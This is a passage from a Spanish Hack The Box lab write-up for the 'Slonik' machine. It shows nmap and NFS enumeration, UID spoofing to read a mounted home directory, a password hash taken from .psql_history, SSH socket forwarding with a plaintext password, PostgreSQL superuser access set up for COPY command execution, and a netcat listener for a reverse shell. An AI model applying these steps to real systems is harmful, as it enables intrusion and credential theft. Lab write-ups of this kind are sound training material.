@@ -1,0 +1,523 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>HackTheBox - Slonik (medium) · MiguelRega7</title>
+<meta name="description" content="Nmap - Comenzamos escaneando puertos abiertos y servicios que corren en los puertos de la máquina por el protocolo TCP. NFS Service - Vemos que la máquina victima esta usando NFS s"><meta name="theme-color" content="#070a0f">
+<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<header class="header"><div class="nav wrap">
+<a class="brand" href="/" aria-label="MiguelRega7">MR<em>7</em></a>
+<nav class="links"><a class="nav-link" data-nav="home" href="/">INICIO</a><a class="nav-link" data-nav="writeups" href="/#writeups">WRITEUPS</a><a class="nav-link" data-nav="about" href="/about/">ABOUT</a></nav>
+<div class="socials">
+<a href="https://github.com/MikeRega7" target="_blank" rel="noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .7a11.5 11.5 0 0 0-3.64 22.4c.58.1.79-.25.79-.56v-2.04c-3.2.7-3.87-1.35-3.87-1.35-.52-1.32-1.27-1.67-1.27-1.67-1.04-.71.08-.7.08-.7 1.15.08 1.75 1.18 1.75 1.18 1.02 1.74 2.67 1.24 3.32.95.1-.74.4-1.24.72-1.53-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.18-3.1-.12-.3-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.73 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.75.11 3.05.74.81 1.18 1.84 1.18 3.1 0 4.43-2.7 5.4-5.26 5.69.41.35.77 1.04.77 2.1v3.07c0 .31.21.67.8.55A11.5 11.5 0 0 0 12 .7Z"/></svg></a>
+<a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" rel="noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M5.2 3.2A2.2 2.2 0 1 1 5.2 7.6a2.2 2.2 0 0 1 0-4.4ZM3.4 8.9h3.6V20H3.4V8.9Zm5.8 0h3.4v1.52h.05c.47-.9 1.62-1.84 3.34-1.84 3.57 0 4.23 2.35 4.23 5.4V20h-3.55v-5.34c0-1.27-.02-2.91-1.77-2.91-1.78 0-2.05 1.39-2.05 2.82V20H9.2V8.9Z"/></svg></a>
+<a href="https://www.instagram.com/_miguelitornuno7" target="_blank" rel="noreferrer" aria-label="Instagram"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="1.8" d="M7 2.9h10A4.1 4.1 0 0 1 21.1 7v10a4.1 4.1 0 0 1-4.1 4.1H7A4.1 4.1 0 0 1 2.9 17V7A4.1 4.1 0 0 1 7 2.9Z"/><circle cx="12" cy="12" r="3.3" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="17.5" cy="6.7" r=".9" fill="currentColor"/></svg></a>
+
+</div><button class="menu" type="button" aria-label="Abrir menú" aria-expanded="false">☰</button>
+</div></header>
+<main class="wrap"><header class="article-head"><a class="back" href="/#writeups">← VOLVER A WRITEUPS</a><div class="article-head-row"><div><span class="article-tag">Hack The Box</span><h1>HackTheBox - Slonik (medium)</h1><div class="meta"><span>◷</span><time>2026-02-07</time><span>·</span><span>WRITEUP</span><span>·</span><span>MR7 LAB</span></div></div><div class="share"><span>Compartir</span><button type="button" class="share-btn" data-copy-url="true">↗</button></div></div><p class="article-excerpt">Nmap - Comenzamos escaneando puertos abiertos y servicios que corren en los puertos de la máquina por el protocolo TCP. NFS Service - Vemos que la máquina victima esta usando NFS s.</p></header><div class="article-layout"><aside class="aside"><div class="aside-title">CONTENIDO</div><a href="#nmap">Nmap</a><a href="#nfs-service">NFS Service</a><a href="#shell-as-service">Shell as service</a><a href="#user-flag">User flag</a><a href="#privilege-escalation">Privilege Escalation</a><a href="#shell-as-root">Shell as root</a></aside><article class="article-content" id="top"><p align="center">
+<img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/0d3cb8993140797ab8ec7f97fb42927a.png">
+</p>
+
+<h2 id="nmap">Nmap</h2>
+<ul>
+<li>Comenzamos escaneando puertos abiertos y servicios que corren en los puertos de la máquina por el protocolo TCP.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ sudo nmap -sCV -p22,111,2049,37441,43237,46303,47737,60659 10.129.234.160 -oN targeted
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-06 20:25 -0600
+Nmap scan report for 10.129.234.160
+Host is up (0.082s latency).
+
+PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 2d:8d:0a:43:a7:58:20:73:6b:8c:fc:b0:d1:2f:45:07 (ECDSA)
+|_  256 82:fb:90:b0:eb:ac:20:a2:53:5e:3c:7c:d3:3c:34:79 (ED25519)
+111/tcp   open  rpcbind  2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100003  3,4         2049/tcp   nfs
+|   100003  3,4         2049/tcp6  nfs
+|   100005  1,2,3      35070/udp6  mountd
+|   100005  1,2,3      49227/tcp6  mountd
+|   100005  2,3        43605/udp   mountd
+|   100005  2,3        60659/tcp   mountd
+|   100021  1,3,4      42499/udp6  nlockmgr
+|   100021  1,3,4      43237/tcp   nlockmgr
+|   100021  1,3,4      44919/tcp6  nlockmgr
+|   100021  1,3,4      54721/udp   nlockmgr
+|   100024  1          45335/udp   status
+|   100024  1          46415/udp6  status
+|   100024  1          47009/tcp6  status
+|   100024  1          47737/tcp   status
+|   100227  3           2049/tcp   nfs_acl
+|_  100227  3           2049/tcp6  nfs_acl
+2049/tcp  open  nfs_acl  3 (RPC #100227)
+37441/tcp open  mountd   1-3 (RPC #100005)
+43237/tcp open  nlockmgr 1-4 (RPC #100021)
+46303/tcp open  mountd   1-3 (RPC #100005)
+47737/tcp open  status   1 (RPC #100024)
+60659/tcp open  mountd   2-3 (RPC #100005)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.69 seconds
+</code></pre></div></div>
+<h2 id="nfs-service">NFS Service</h2>
+<ul>
+<li><p>Vemos que la máquina victima esta usando NFS si buscamos en Google que es encontramos lo siguiente &lt;<a href="https://www.ibm.com/docs/es/aix/7.1.0?topic=management-network-file-system">https://www.ibm.com/docs/es/aix/7.1.0?topic=management-network-file-system</a>&gt;.</p>
+</li>
+<li><p>En Hacktricks &lt;<a href="https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html">https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html</a>&gt; encontramos como enumerar este servicio.</p>
+</li>
+<li><p>Vamos a comenzar enumerando este servicio con Nmap ya que nos dicen que Nmap cuenta con scripts para poder enumerar este servicio.</p>
+</li>
+<li><p>Vemos 2 directorios.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.129.234.160
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-06 20:30 -0600
+Nmap scan report for 10.129.234.160
+Host is up (0.089s latency).
+
+PORT    STATE SERVICE
+111/tcp open  rpcbind
+| nfs-statfs: 
+|   Filesystem    1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
+|   /var/backups  6915100.0  2893928.0  3932628.0  43%   16.0T        32000
+|_  /home         6915100.0  2893928.0  3932628.0  43%   16.0T        32000
+| nfs-ls: Volume /var/backups
+|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
+| PERMISSION  UID  GID  SIZE     TIME                 FILENAME
+| rwxr-xr-x   0    0    4096     2026-02-07T02:30:05  .
+| ??????????  ?    ?    ?        ?                    ..
+| rw-r--r--   0    0    4666456  2026-02-07T02:30:05  archive-2026-02-07T0230.zip
+| 
+| 
+| Volume /home
+|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
+| PERMISSION  UID   GID   SIZE  TIME                 FILENAME
+| ??????????  ?     ?     ?     ?                    .
+| ??????????  ?     ?     ?     ?                    ..
+| rwxr-x---   1337  1337  4096  2025-09-22T12:46:40  service
+|_
+| nfs-showmount: 
+|   /var/backups *
+|_  /home *
+</code></pre></div></div>
+<ul>
+<li>También podemos usar la herramienta showmount para poder enumerar mas cómodo.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ showmount -e 10.129.234.160
+Export list for 10.129.234.160:
+/var/backups *
+/home
+</code></pre></div></div>
+<ul>
+<li><p>Si observamos en el output del comando nos muestra * eso significa que cualquier máquina puede acceder a las carpetas de este servidor, lo que haremos es hacer una montura que básicamente es conectar una carpeta remota a nuestro sistema.</p>
+</li>
+<li><p>Para hacer eso primeros necesitamos crear una directorio.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ mkdir montura
+</code></pre></div></div>
+<ul>
+<li>Ahora creamos la montura (hay que hacerlo con sudo para que funcione).</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ sudo mount -t nfs 10.129.234.160: ./montura/
+</code></pre></div></div>
+<ul>
+<li>No tenemos permisos para entrar en /home/service.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ tree
+.
+├── home
+│   └── service  [error opening dir]
+└── var
+    └── backups
+        ├── archive-2026-02-07T0230.zip
+        ├── archive-2026-02-07T0231.zip
+        ├── archive-2026-02-07T0232.zip
+        ├── archive-2026-02-07T0233.zip
+        ├── archive-2026-02-07T0234.zip
+        ├── archive-2026-02-07T0235.zip
+        ├── archive-2026-02-07T0236.zip
+        ├── archive-2026-02-07T0237.zip
+        └── archive-2026-02-07T0238.zip
+
+5 directories, 9 files
+</code></pre></div></div>
+<ul>
+<li>Si observamos por que no podemos entrar es básicamente por que solo el usuario 1337 puede entrar ya que el UID del grupo es 1337 y nosotros en nuestra máquina estamos como root es por eso que no podemos entrar.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ ls -lha
+drwxr-xr-x root root 4.0 KB Tue Oct 24 07:03:30 2023  .
+drwxr-xr-x root root 4.0 KB Mon Sep 22 05:04:28 2025  ..
+drwxr-x--- 1337 1337 4.0 KB Mon Sep 22 06:46:40 2025  service
+</code></pre></div></div>
+<ul>
+<li>En estos casos lo que se hace es crear un usuario con el UID 1337 para poder acceder al recurso ya que NFS los permisos se basan en IDs, no en nombres.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ sudo useradd -u 1337 -m service
+</code></pre></div></div>
+<ul>
+<li>Ahora migramos al usuario y podemos enumerar.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ sudo su service
+$ bash
+┌──(service㉿miguecorp)-[/home/jmiguelr7/Hackthebox/Medium/Slonik/nmap/montura/home]
+└─$ ls -lha
+total 12K
+drwxr-xr-x  3 root    root    4.0K oct 24  2023 .
+drwxr-xr-x 19 root    root    4.0K sep 22 05:04 ..
+drwxr-x---  5 service service 4.0K sep 22 06:46 service
+
+┌──(service㉿miguecorp)-[/home/jmiguelr7/Hackthebox/Medium/Slonik/nmap/montura/home]
+└─$ cd service/
+
+┌──(service㉿miguecorp)-[/home/jmiguelr7/Hackthebox/Medium/Slonik/nmap/montura/home/service]
+└─$ ls -lah
+total 40K
+drwxr-x--- 5 service service 4.0K sep 22 06:46 .
+drwxr-xr-x 3 root    root    4.0K oct 24  2023 ..
+-rw-r--r-- 1 service service   90 sep 22 06:46 .bash_history
+-rw-r--r-- 1 service service  220 oct 24  2023 .bash_logout
+-rw-r--r-- 1 service service 3.7K oct 24  2023 .bashrc
+drwx------ 2 service service 4.0K oct 24  2023 .cache
+drwxrwxr-x 3 service service 4.0K oct 24  2023 .local
+-rw-r--r-- 1 service service  807 oct 24  2023 .profile
+-rw-r--r-- 1 service service  326 sep 22 06:46 .psql_history
+drwxrwxr-x 2 service service 4.0K oct 24  2023 .ssh
+</code></pre></div></div>
+<ul>
+<li>Tenemos el archivo .psql_history el cual contiene contenido interesante el cual es un hashen MD5.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">┌──(service㉿miguecorp)-[/home/jmiguelr7/Hackthebox/Medium/Slonik/nmap/montura/home/service]
+└─$ cat .psql_history 
+CREATE DATABASE service;
+\c service;
+CREATE TABLE users ( id SERIAL PRIMARY KEY, username VARCHAR(255) NOT NULL, password VARCHAR(255) NOT NULL, description TEXT);
+INSERT INTO users (username, password, description)VALUES ('service', 'aaabf0d39951f3e6c3e8a7911df524c2'WHERE', network access account');
+select * from users;
+\q
+</code></pre></div></div>
+<ul>
+<li>Si quieras desmontar la montura simplemente has esto:</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ sudo umount /ruta/de/la/montura
+</code></pre></div></div>
+<ul>
+<li>Vamos a crackear el hash.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/Slonik/1.png">
+</p>
+
+<h2 id="shell-as-service">Shell as service</h2>
+<ul>
+<li><p>Vamos a conectarnos por SSH.</p>
+</li>
+<li><p>Vemos que al conectarnos por SSH la conexión se cierra.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ ssh service@10.129.234.160
+The authenticity of host '10.129.234.160 (10.129.234.160)' can't be established.
+ED25519 key fingerprint is: SHA256:j/hcANass/0veF/m0NAMOR41osL5zUMMMQ9nCYiwjmY
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.234.160' (ED25519) to the list of known hosts.
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@/     %@@@@@@@@@@.      @&amp;             @@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@   ############.    ############   ##########*  &amp;@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@  ###############  ###################  /##########  @@@@@@@@@@@@@ 
+@@@@@@@@@@ ###############( #######################(  #########  @@@@@@@@@@@@ 
+@@@@@@@@@  ############### (#########################  ######### @@@@@@@@@@@@ 
+@@@@@@@@@ .##############  ###########################( #######  @@@@@@@@@@@@ 
+@@@@@@@@@  ############## (        ##############        ######  @@@@@@@@@@@@ 
+@@@@@@@@@. ############## #####   # .########### ##  ##  #####. @@@@@@@@@@@@@ 
+@@@@@@@@@@ .############# /########  ########### *##### ###### @@@@@@@@@@@@@@ 
+@@@@@@@@@@. ############# (########( ###########/ ##### ##### (@@@@@@@@@@@@@@ 
+@@@@@@@@@@@  ###########( #########, ############( ####  ### (@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@ (##########/ #########  ##############  ##  #( @@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@( ###########  #######  ################  / #  @@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@  ############  ####  ###################    @@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@, ##########  @@@      ################            (@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@ .######  @@@@   ###  ##############  #######   @@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@(  *   @. #######    ############## (@((&amp;@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%&amp;@@@@  #############( @@@@@@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #############  @@@@@@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/ ############# ,@@@@@@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ############( @@@@@@@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  ###########  @@@@@@@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #######*  @@@@@@@@@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&amp;   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
+(service@10.129.234.160) Password: 
+(service@10.129.234.160) Password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1036-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Sat Feb  7 03:04:37 UTC 2026
+
+  System load:           0.08
+  Usage of /:            42.6% of 6.59GB
+  Memory usage:          7%
+  Swap usage:            0%
+  Processes:             229
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.234.160
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:8b76
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Connection to 10.129.234.160 closed.
+</code></pre></div></div>
+<ul>
+<li><p>Si analizamos el .bash_history  en la carpeta /var/run/postgresql/ es donde PostgreSQL  crea sus sockets &lt;<a href="https://djangodeployment.readthedocs.io/en/latest/08-postgresql.html">https://djangodeployment.readthedocs.io/en/latest/08-postgresql.html</a>&gt;.</p>
+</li>
+<li><p>En este comando se confirma que es un socket  en el puerto 5432.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">file /var/run/postgresql/.s.PGSQL.5432
+</code></pre></div></div>
+<ul>
+<li>Después vemos que intenta conectarse a PostgreSQL.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">psql -U postgres
+</code></pre></div></div>
+<ul>
+<li>Y sale de la sesión.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">exit
+</code></pre></div></div>
+<ul>
+<li>Vamos a hacer que el socket del servidor remoto aparezca en nuestra máquina.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">$ sshpass -p 'service' ssh -f -N -L /tmp/.s.PGSQL.5432:/var/run/postgresql/.s.PGSQL.5432 -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=no&quot; service@10.129.234.160
+Warning: Permanently added '10.129.234.160' (ED25519) to the list of known hosts.
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@/     %@@@@@@@@@@.      @&amp;             @@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@   ############.    ############   ##########*  &amp;@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@  ###############  ###################  /##########  @@@@@@@@@@@@@ 
+@@@@@@@@@@ ###############( #######################(  #########  @@@@@@@@@@@@ 
+@@@@@@@@@  ############### (#########################  ######### @@@@@@@@@@@@ 
+@@@@@@@@@ .##############  ###########################( #######  @@@@@@@@@@@@ 
+@@@@@@@@@  ############## (        ##############        ######  @@@@@@@@@@@@ 
+@@@@@@@@@. ############## #####   # .########### ##  ##  #####. @@@@@@@@@@@@@ 
+@@@@@@@@@@ .############# /########  ########### *##### ###### @@@@@@@@@@@@@@ 
+@@@@@@@@@@. ############# (########( ###########/ ##### ##### (@@@@@@@@@@@@@@ 
+@@@@@@@@@@@  ###########( #########, ############( ####  ### (@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@ (##########/ #########  ##############  ##  #( @@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@( ###########  #######  ################  / #  @@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@  ############  ####  ###################    @@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@, ##########  @@@      ################            (@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@ .######  @@@@   ###  ##############  #######   @@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@(  *   @. #######    ############## (@((&amp;@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%&amp;@@@@  #############( @@@@@@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #############  @@@@@@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/ ############# ,@@@@@@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ############( @@@@@@@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  ###########  @@@@@@@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #######*  @@@@@@@@@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&amp;   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
+</code></pre></div></div>
+<ul>
+<li>Ahora ya podemos entrar.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">┌──(service㉿miguecorp)-[/home/jmiguelr7/Hackthebox/Medium/Slonik/content/montura/home/service]
+└─$ psql -h /tmp -U postgres
+psql (18.1 (Debian 18.1-2), servidor 14.19 (Ubuntu 14.19-0ubuntu0.22.04.1))
+Digite «help» para obtener ayuda.
+
+postgres=#
+</code></pre></div></div>
+<ul>
+<li>Tenemos permisos de SuperUser.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">postgres=# \du
+                              Listado de roles
+ Nombre de rol |                         Atributos                          
+---------------+------------------------------------------------------------
+ postgres      | Superusuario, Crear rol, Crear BD, Replicación, Ignora RLS
+
+postgres=#
+</code></pre></div></div>
+<ul>
+<li><p>Podemos obtener ejecución remota de comandos gracias a eso &lt;<a href="https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767">https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767</a>&gt; tal como no lo explican en el articulo.</p>
+</li>
+<li><p>Primero tenemos que crear una tabla.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">postgres=# CREATE TABLE shell(output text);
+CREATE TABLE
+</code></pre></div></div>
+<ul>
+<li>Ahora nos ponemos en escucha.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ nc -nlvp 443
+listening on [any] 443 ...
+</code></pre></div></div>
+<ul>
+<li>Ahora nos enviamos la shell.</li>
+</ul>
